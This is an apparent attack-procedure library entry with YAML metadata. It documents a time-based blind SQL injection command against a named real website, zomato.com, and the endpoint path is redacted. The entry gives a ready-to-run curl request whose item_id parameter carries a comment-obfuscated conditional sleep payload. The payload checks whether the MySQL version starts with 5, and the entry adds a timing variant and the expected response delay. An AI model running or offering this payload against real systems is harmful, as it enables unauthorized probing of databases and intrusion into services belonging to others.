---
data: >-
  curl -X POST "https://www.zomato.com/php/██████████" -d
  "res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111"
tags:
  - sqli
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.222Z'
id: e8f7d944-c990-46fb-9691-434eb9e28678
verified: false
validated: true
submitted: true
---
# zomato-sqli-version-check-5

## Command

```bash
curl -X POST "https://www.zomato.com/php/██████████" \
  -d "res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111"
```

## Description

Injects a conditional sleep payload to check if MySQL version starts with '5', sleeping 5s if true for time-based inference.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d` | Body data with URL-encoded tags | Yes |
| `item_id=...` | Conditional payload | Yes |
| Others | As in POC | Yes |

## Examples

### Basic Usage

As above.

### With Timing

```bash
curl ... --write-out "%{time_total}s\n"
```

## Expected Output

~6090ms response if true.

## Related

- [[Related Procedure: Extract-Database-Version-Using-Conditional-Sleep-Payload]]
